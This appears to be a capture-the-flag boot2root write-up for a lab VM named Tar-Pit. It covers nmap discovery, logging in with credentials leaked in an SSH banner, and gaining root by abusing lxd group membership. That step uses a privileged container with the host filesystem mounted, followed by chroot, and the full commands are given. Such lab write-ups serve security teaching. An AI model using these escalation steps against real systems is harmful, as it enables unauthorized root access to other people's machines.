@@ -1,0 +1,234 @@
+Tar-Pit Boot2Root Write-Up
+Challenge Intro
+
+Name: Tar-Pit
+Category: Boot2Root / Linux
+Difficulty: Medium
+Goal: Obtain root access and retrieve the final flag.
+
+Tar-Pit is a realistic Linux boot-to-root challenge focused on operational misconfigurations rather than exploits. At first glance, the system appears locked down: no web services, no obvious vulnerabilities, and restricted privilege boundaries. However, subtle development and maintenance mistakes leave behind breadcrumbs that, when followed patiently, lead to full system compromise.
+
+This challenge rewards careful enumeration, attention to detail, and a solid understanding of Linux privilege escalation mechanics, particularly containerization risks.
+
+Initial Enumeration
+
+After importing the VM and booting it in a VirtualBox host-only network, initial network configuration was checked from the attacker machine.
+
+ip a
+
+
+The attacker machine was placed on the 192.168.56.0/24 subnet.
+
+Host discovery was then performed:
+
+nmap -sn 192.168.56.0/24
+
+
+Multiple hosts were detected. Two VirtualBox guests were identified:
+
+192.168.56.100
+
+192.168.56.104
+
+Light service probing was used to determine the real target.
+
+Service Enumeration
+
+A minimal port scan was performed on both candidates.
+
+nmap -Pn -p 22,80,443 192.168.56.100
+
+
+Result:
+
+All ports filtered
+
+This host was ruled out.
+
+Scanning the second host:
+
+nmap -Pn -p 22,80,443 192.168.56.104
+
+
+Result:
+
+22/tcp open (SSH)
+
+HTTP/HTTPS closed
+
+This aligned with the challenge description: “no obvious attack surface”.
+
+Initial Access (SSH Banner Misconfiguration)
+
+Connecting to the SSH service without specifying a username revealed an important breadcrumb:
+
+ssh 192.168.56.104
+
+
+Banner output included:
+
+Welcome
+usr:dev
+pass:dev@2022
+
+
+This indicated hard-coded development credentials, a classic internal misconfiguration.
+
+Using the leaked credentials:
+
+ssh dev@192.168.56.104
+
+
+Login succeeded, providing an initial shell as user dev.
+
+Local Enumeration
+
+User and group context was verified:
+
+whoami
+id
+
+
+Output showed:
+
+User: dev
+
+Groups included:
+
+sudo
+
+lxd
+
+Attempting sudo escalation:
+
+sudo -l
+
+
+Result:
+
+Sorry, user dev may not run sudo
+
+
+This confirmed intentional misdirection: the sudo group membership was present but explicitly restricted.
+
+The remaining interesting group was lxd.
+
+Breadcrumb Discovery
+
+Before escalating, filesystem inspection was performed, focusing on locations commonly abused by developers.
+
+ls -la /opt
+
+
+Findings:
+
+/opt/backup/
+
+/opt/dev_notes.txt
+
+The developer notes confirmed that the dev credentials were temporary and never rotated. While not directly exploitable further, this reinforced the development-environment theme of the challenge.
+
+No cron jobs, systemd timers, or backup scripts were found to be misconfigured. This ruled out classic cron-based escalation paths.
+
+At this point, LXD group membership remained the only viable escalation vector.
+
+Privilege Escalation via LXD
+
+Membership in the lxd group allows a user to manage containers. Critically, privileged containers can mount the host filesystem, making this equivalent to root access if misused.
+
+Verifying LXD Access
+lxc list
+
+
+The command executed successfully, confirming usable LXD access without sudo.
+
+Outbound internet access was restricted, preventing image downloads. An offline escalation path was required.
+
+Offline LXD Exploitation
+Creating a Minimal Root Filesystem
+
+A minimal root filesystem was created using BusyBox, ensuring /bin/sh existed:
+
+mkdir -p rootfs/bin
+cp /bin/busybox rootfs/bin/
+ln -s /bin/busybox rootfs/bin/sh
+tar -czf rootfs.tar.gz -C rootfs .
+
+
+Minimal LXD metadata was also created:
+
+architecture: "x86_64"
+creation_date: 1700000000
+properties:
+  description: "empty rootfs"
+  os: "linux"
+
+
+Both were imported into LXD:
+
+lxc image import meta.tar.gz rootfs.tar.gz
+
+
+The new image fingerprint was identified via:
+
+lxc image list
+
+Privileged Container Setup
+
+A new container was initialized from the imported image:
+
+lxc init <fingerprint> pwn
+
+
+The container was configured as privileged and instructed to start /bin/sh:
+
+lxc config set pwn security.privileged true
+lxc config set pwn raw.lxc "lxc.init.cmd = /bin/sh"
+
+
+The host root filesystem was mounted inside the container:
+
+lxc config device add pwn host-root disk source=/ path=/mnt/root recursive=true
+
+
+The container was then started:
+
+lxc start pwn
+
+Root Shell Acquisition
+
+Entering the container:
+
+lxc exec pwn -- /bin/sh
+
+
+The shell prompt confirmed root inside the container.
+
+The final pivot was performed using chroot:
+
+chroot /mnt/root /bin/bash
+
+
+Verification:
+
+whoami
+id
+
+
+Output confirmed:
+
+uid=0(root)
+
+
+Full root access on the host was achieved.
+
+Flag Retrieval
+
+Following standard boot2root convention, the root directory was inspected:
+
+ls -la /root
+
+
+The final flag was located and retrieved:
+
+cat /root/root.txt
